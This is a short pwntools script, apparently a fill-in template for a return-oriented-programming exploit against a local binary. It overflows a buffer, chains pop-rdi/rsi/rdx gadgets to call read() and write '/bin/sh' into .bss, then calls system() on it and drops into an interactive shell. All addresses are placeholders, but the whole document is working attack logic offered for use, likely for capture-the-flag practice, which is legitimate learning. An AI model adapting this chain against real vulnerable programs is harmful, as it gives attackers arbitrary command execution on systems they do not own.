from pwn import *

offset       = "your offset"                 
pop_rdi      = "your pop rdi"         
pop_rsi      = "your pop rsi"         
pop_rdx      = "your pop rdx"         
read_plt     = "your read@plt address"      
system_addr  = "your system addr"   
bss_addr     = "your bss addr"        
WRITE_SIZE   = 0x20             

payload = b"A" * offset

payload += p64(pop_rdi)   
payload += p64(0)         
payload += p64(pop_rsi)   
payload += p64(bss_addr)
payload += p64(pop_rdx)  
payload += p64(WRITE_SIZE)
payload += p64(read_plt)   

payload += p64(pop_rdi)
payload += p64(bss_addr)
payload += p64(system_addr)


p = process("./your binary")
p.sendline(payload)     

p.send(b"/bin/sh\x00".ljust(WRITE_SIZE, b"\x00"))
p.interactive()
